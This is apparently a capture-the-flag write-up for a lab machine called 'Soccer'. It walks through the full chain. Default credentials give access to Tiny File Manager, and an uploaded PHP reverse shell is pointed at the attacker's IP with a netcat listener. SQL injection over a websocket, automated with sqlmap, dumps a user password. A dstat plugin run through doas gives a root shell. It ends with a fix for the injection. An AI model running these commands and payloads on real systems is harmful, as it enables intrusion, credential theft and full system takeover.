

## Ports scans

Initial Scan via `rustscan` (not for production)

```bash
rustscan -a 10.129.54.49 -r 1-65535
```

```
PORT     STATE SERVICE        REASON
22/tcp   open  ssh            syn-ack ttl 63
80/tcp   open  http           syn-ack ttl 63
9091/tcp open  xmltec-xmlmail syn-ack ttl 63
```

Targeted `nmap` scan on the discovered ports

```
nmap -sC -sV -T5 -v -p22,80,9091 10.129.54.49
```

```
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Sat, 05 Sep 2026 18:05:10 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Sat, 05 Sep 2026 18:05:11 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.99%I=7%D=9/5%Time=6A9C59D1%P=x86_64-pc-linux-gnu%r(inf
SF:ormix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\
SF:n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2
SF:0close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r\n
SF:Content-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCon
SF:tent-Length:\x20139\r\nDate:\x20Sat,\x2005\x20Sep\x202026\x2018:05:10\x
SF:20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=
SF:\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n</h
SF:ead>\n<body>\n<pre>Cannot\x20GET\x20/</pre>\n</body>\n</html>\n")%r(HTT
SF:POptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Poli
SF:cy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nC
SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r
SF:\nDate:\x20Sat,\x2005\x20Sep\x202026\x2018:05:11\x20GMT\r\nConnection:\
SF:x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<met
SF:a\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Ca
SF:nnot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTSPRequest,16C,"HTT
SF:P/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-sr
SF:c\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20t
SF:ext/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Sat,\x
SF:2005\x20Sep\x202026\x2018:05:11\x20GMT\r\nConnection:\x20close\r\n\r\n<
SF:!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset=\"ut
SF:f-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OPTIONS\x
SF:20/</pre>\n</body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r
SF:(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnecti
SF:on:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## port 80

Visiting the website

![](pics/Pasted%20image%2020260905211819.png)

Checking the source code for exposed endpoints or information in general

![](pics/Pasted%20image%2020260905211919.png)

Found nothing

Checking for vulnerbilities on the ngix `1.18`

```bash
searchsploit nginx 1.1
```

![](pics/Pasted%20image%2020260905212239.png)

Nothing useful too.
Fuzzing the website for new attack surface

```bash
ffuf -u http://soccer.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt 
```

![](pics/Pasted%20image%2020260905212829.png)

I extra fuzzed via the dotfiles_linux wordlist just to make sure

```
ffuf -u http://soccer.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/UnixDotfiles.fuzz.txt
```

![](pics/Pasted%20image%2020260905212934.png)

```
-- ALL 403 --
Dura.htaccess.save
Dura.htaccess~
Dura.cobalt/sysManage/../admin/.htaccess
Dura.htaccess
Dura.htaccess.old
Dura.htpasswd
Dura
```

Visiting the `tiny`  endpoint that we found during the first fuzz

![](pics/Pasted%20image%2020260905213041.png)

Exploring the open source code of the tiny file manager

![](pics/Pasted%20image%2020260905213759.png)

The system user might still be running with the default creds found in the source code

```
admin:admin@123
```

![](pics/Pasted%20image%2020260905214002.png)

Enter the found creds then hit sign in

![](pics/Pasted%20image%2020260905214032.png)

And we are logged in. Now the first thing I did is fingerprint the version of the file manager

![](pics/Pasted%20image%2020260905214135.png)

Lets try to find and RCE maybe a file upload or something.

```
searchsploit Tiny File Manager
```

![](pics/Pasted%20image%2020260905214405.png)

![](pics/Pasted%20image%2020260905214420.png)

I had to make sure this exploit works on the version we have so I visited the link.

![](pics/Pasted%20image%2020260905214339.png)

Scrolled down to read more about the vulnerability

![](pics/Pasted%20image%2020260905214551.png)

So Now I am confident that this will work on my target since this works on version below `2.4.6`.

I checked out the exploit bash script to see if anything needs to be edited, I found a bad name for a function containing a `-` changed it to `_` other than that just pass the 3 args needed by the script. 

```
URL = http://soccer.htb/tiny/
admin = admin
password = admin@123
```

![](pics/Pasted%20image%2020260905215915.png)

Call it by the new name of course

![](pics/Pasted%20image%2020260905215937.png)

Old code:

```bash
-----snip-----------
log-in()
-----snip-----------
# Also changed the function to the new name
log-in $1 $2 $3
```

![](pics/Pasted%20image%2020260905220244.png)

After modification:

```bash
-----snip-----------
# Changed this from log-in to log_in because that is a bad name:w
log_in()
-----snip-----------
# Also changed the function to the new name
log_in $1 $2 $3


```

```bash
./50828.sh 'http://soccer.htb/tiny/' 'admin' 'admin@123'
```

![](pics/Pasted%20image%2020260905220321.png)

Seems to be a problem. Nothing better than manual exploitation.

```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
```

Changed some things

```php
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.82';  // CHANGED THIS
$port = 9911;       // CHANGED THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i'; // CHANGED THIS
$daemon = 0;
$debug = 0;
```

Now lets upload the file to the file manager

![](pics/Pasted%20image%2020260906161232.png)

Before running the php shell make sure you `nc` is setup

```
nc -lvnp 9911
```

Used that last part of the `Destination Folder` and add the php shell name to execute it.

```
/tiny/uploads/<our_file_name>

becomes:
http://soccer.htb/tiny/uploads/php-reverse-shell.php 
```

Got the shell

![](pics/Pasted%20image%2020260906161500.png)

Trying to cat the flag from the `player` home directory

![](pics/Pasted%20image%2020260906161720.png)
![](pics/Pasted%20image%2020260906161811.png)

## PrivEsc

Running the `linpes` script to local enumerate the machine, first move to the tmp directory

```bash
cd /tmp
```

Start a python server serving the `linpes`.

```bash
python3 -m http.server 80
```

Download the script

```bash
wget http://10.10.14.82/linpeas.sh
```

![](pics/Pasted%20image%2020260906163635.png)

Add execute permission

```bash
chmod +x linpeas.sh
```

Interesting findings

Kernel exploits

```
CVE: CVE-2021-3493 | Name: Ubuntu OverlayFS | Match data: pkg=linux-kernel,ver>=3.13,ver<5.14,x86_64 | Tags: ubuntu=(14.04|16.04|18.04|20.04|20.10) | Rank: 1 | Details: Only Ubuntu is affected.

CVE: CVE-2021-22555 | Name: Netfilter heap out-of-bounds write | Match data: pkg=linux-kernel,ver>=2.6.19,ver<=5.12-rc6 | Tags: ubuntu=20.04{kernel:5.8.0-*} | Rank: 1 | Details: ip_tables kernel module must be loaded

CVE: CVE-2022-32250 | Name: nft_object UAF (NFT_MSG_NEWSET) | Match data: pkg=linux-kernel,ver<5.18.1,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1 | Tags: ubuntu=(22.04){kernel:5.15.0-27-generic} | Rank: 1 | Details: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

CVE: CVE-2026-43503 | Name: DirtyClone | Match data: pkg=linux-kernel,ver>=3.9,ver<5.10.257 | Tags: 1 | Rank: Fixed in stable 5.10.257; exploit path is in the networking stack and may be mitigated by removing the relevant ESP modules

CVE: CVE-2026-46333 | Name: ptrace exit-race | Match data: pkg=linux-kernel,ver>=4.10,ver<5.10.256,cmd:[ "$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null || echo 0)" -lt 2 ] | Tags: 1 | Rank: Upstream issue introduced in 4.10; fixed in 5.10.256; mitigated by kernel.yama.ptrace_scope >= 2

CVE: CVE-2026-43499 | Name: GhostLock rtmutex UAF | Match data: pkg=linux-kernel,ver>=2.6.39,ver<5.10.261,CONFIG_FUTEX_PI=y | Tags: 1 | Rank: Fixed in stable 5.10.261; priority-inheritance futexes must be enabled
```

SUIDs

```bash
-rwsr-xr-x 1 root root 42K Nov 17  2022 /usr/local/bin/doas
-rwsr-xr-x 1 root root 140K Nov 28  2022 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-- 1 root messagebus 51K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 463K Mar 30  2022 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 23K Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 39K Feb  7  2022 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 55K Feb  7  2022 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8/util-linux_mount<=2.41.3(CVE-2026-27456)/util-linux_mount>=2.39_before_2.41.5_or_2.42.2(CVE-2026-53612)/util-linux_mount>=2.39.1_before_2.41.5_or_2.42.2(CVE-2026-53614)/util-linux_mount_2.39_to_2.41.5_or_2.42_to_2.42.2(CVE-2026-76642)/util-linux_mount_2.42.x_before_2.42.3(CVE-2026-78409)/util-linux_mount<=2.42.2(CVE-2026-78410)
-rwsr-xr-x 1 root root 67K Feb  7  2022 /usr/bin/su
-rwsr-xr-x 1 root root 44K Nov 29  2022 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 84K Nov 29  2022 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 163K Jan 19  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 67K Nov 29  2022 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 87K Nov 29  2022 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 52K Nov 29  2022 /usr/bin/chsh
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 121K Nov 25  2022 /snap/snapd/17883/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 84K Mar 14  2022 /snap/core20/1695/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 52K Mar 14  2022 /snap/core20/1695/usr/bin/chsh
-rwsr-xr-x 1 root root 87K Mar 14  2022 /snap/core20/1695/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55K Feb  7  2022 /snap/core20/1695/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8/util-linux_mount<=2.41.3(CVE-2026-27456)/util-linux_mount>=2.39_before_2.41.5_or_2.42.2(CVE-2026-53612)/util-linux_mount>=2.39.1_before_2.41.5_or_2.42.2(CVE-2026-53614)/util-linux_mount_2.39_to_2.41.5_or_2.42_to_2.42.2(CVE-2026-76642)/util-linux_mount_2.42.x_before_2.42.3(CVE-2026-78409)/util-linux_mount<=2.42.2(CVE-2026-78410)
-rwsr-xr-x 1 root root 44K Mar 14  2022 /snap/core20/1695/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 67K Mar 14  2022 /snap/core20/1695/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 67K Feb  7  2022 /snap/core20/1695/usr/bin/su
-rwsr-xr-x 1 root root 163K Jan 19  2021 /snap/core20/1695/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 39K Feb  7  2022 /snap/core20/1695/usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-- 1 root systemd-resolve 51K Oct 25  2022 /snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 463K Mar 30  2022 /snap/core20/1695/usr/lib/openssh/ssh-keysign
```

ALL of this did not  work as I was reading the kernel exploits details none were related to the machine. On the `linpeas` output I found a hidden subdomain inside the `ngix` folder 

```
lrwxrwxrwx 1 root root 41 Nov 17  2022 /etc/nginx/sites-enabled/soc-player.htb -> /etc/nginx/sites-available/soc-player.htb
server {
	listen 80;
	listen [::]:80;
	server_name soc-player.soccer.htb;
	root /root/app/views;
	location / {
		proxy_pass http://localhost:3000;
		proxy_http_version 1.1;
		proxy_set_header Upgrade $http_upgrade;
		proxy_set_header Connection 'upgrade';
		proxy_set_header Host $host;
		proxy_cache_bypass $http_upgrade;
	}
}
```

Add this to the `/etc/hosts`

```
soc-player.soccer.htb
```

![](pics/Pasted%20image%2020260906182148.png)

Now lets visit it now.

![](pics/Pasted%20image%2020260906182224.png)

There is 3 labels new we did not see on the first website which are `Match`, `Login` and `Signup`.

![](pics/Pasted%20image%2020260906182320.png)

![](pics/Pasted%20image%2020260906182344.png)

![](pics/Pasted%20image%2020260906182356.png)

Created a dummy user to explore the website more

![](pics/Pasted%20image%2020260906190521.png)

New label called `Tickets` showed up when I check it on burp I found a websocket connection is created

![](pics/Pasted%20image%2020260906183200.png)

Lets check for SQLi
first I tried this payload since I know that this runs mysql from the linpeas enumeration.

```
{"id":"56098' or 1=1-- -"}
```

![](pics/Pasted%20image%2020260906190202.png)

This did not work since Ticket is not found. So I tried without the quote

![](pics/Pasted%20image%2020260906190300.png)

Now it exist, to double check I changed the `1` to `2`

```
{"id":"56098 or 2=1-- -"}
```

![](pics/Pasted%20image%2020260906190437.png)

That says does not work so this indeed is vulnerable to SQLi. Now lets automate this via `SQLmap`

- Since this is not communicating on the website endpoint, Instead it is used port `9091`
![](pics/Pasted%20image%2020260906190721.png)

So we do not even need to authenticate to the website to reach this websocket

![](pics/Pasted%20image%2020260906191134.png)


Now that we have everything we need lets run sqlmap

```bash
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id":"*"}' --level 5 --risk 3 --batch
```

![](pics/Pasted%20image%2020260906193626.png)

Enumerate the databases

```bash
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id":"*"}' --level 5 --risk 3 --batch --dbs
```

![](pics/Pasted%20image%2020260906204424.png)

Now lets dump the contents of the `soccer_d` db

```bash
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id":"*"}' --level 5 --risk 3 --batch -D soccer_db --dump
```

![](pics/Pasted%20image%2020260906212813.png)

New creds that we can try on SSH since there was a home directory called `player`

```
player:PlayerOftheMatch2022 
```

Trying via this command

```
ssh player@soccer.htb 
```

![](pics/Pasted%20image%2020260906213202.png)

And we succeed.

## Flag 1

![](pics/Pasted%20image%2020260906213231.png)


## PrivEsc

Coming back to this finding 

```
-rwsr-xr-x 1 root root 42K Nov 17  2022 /usr/local/bin/doas
```

This sounds interesting so I opened the man page for it.

![](pics/Pasted%20image%2020260906215224.png)

So this means it is a BSD version of sudo reading carefully you can see there is a config file the specify the what can you run as which user.

```
/usr/local/etc/doas.conf
```

This was on the man page so I tried it

![](pics/Pasted%20image%2020260906215436.png)

As we see we can execute `dstat` as root. So the first thing I did is opened `gtfobins` and I found this

![](pics/Pasted%20image%2020260906215728.png)

We can put a python file inside the plugins directory that we can write to and write anything that will be executed as root via the `doas`. So lets find which directories we control.

![](pics/Pasted%20image%2020260906215952.png)

We can not write to this.......

![](pics/Pasted%20image%2020260906220146.png)

we can write to this

![](pics/Pasted%20image%2020260906220303.png)

Go to the directory we control and create a python file named `dstat_exploit.py` and add the shell spawning code. finally utilize `doas` as root to make `dstat` execute our shell script as root!

```bash
cd /usr/local/share/dstat
echo 'import os; os.execl("/bin/sh", "sh")' > dstat_exploit.py
doas -u root /usr/bin/dstat --exploit
```

![](pics/Pasted%20image%2020260906221201.png)

## Flag 2

![](pics/Pasted%20image%2020260906221305.png)


![](pics/Pasted%20image%2020260906221249.png)

Done.

## Vulnerability analysis

Now I am the root, I can check the underlaying code that allowed me to perform an SQL injection

```js
socket.on('connection', ws=> {
  ws.on('message', function incoming(data) {
    try {
      var id = JSON.parse(data).id;
    } catch (e) {
      //console.log(e);
    }
    (async () => {
          try {
            const query = `Select id,username,password  FROM accounts where id = ${id}`;
            await connection.query(query, function (error, results, fields) {
                if (error) {
                  ws.send("Ticket Doesn't Exist");
                } else {
                  if (results.length > 0) {
                    ws.send("Ticket Exists")
                  } else {
                    ws.send("Ticket Doesn't Exist")
                  }
                }
              });
          } catch (error) {
            ws.send("Error");
          }
      })()
   });
});
```

We can see here that the `id` is being parsed from json without any sanitization

```js
var id = JSON.parse(data).id;
```

You can make this more robust by checking for dangerous chars

Then being used to query the database raw so anything user input is being added to the query.

```js
const query = `Select id,username,password  FROM accounts where id = ${id}`;
```

To solve this change the query to this instead (parameterized)

```js
const query = `Select id,username,password  FROM accounts where id = ?`;
```



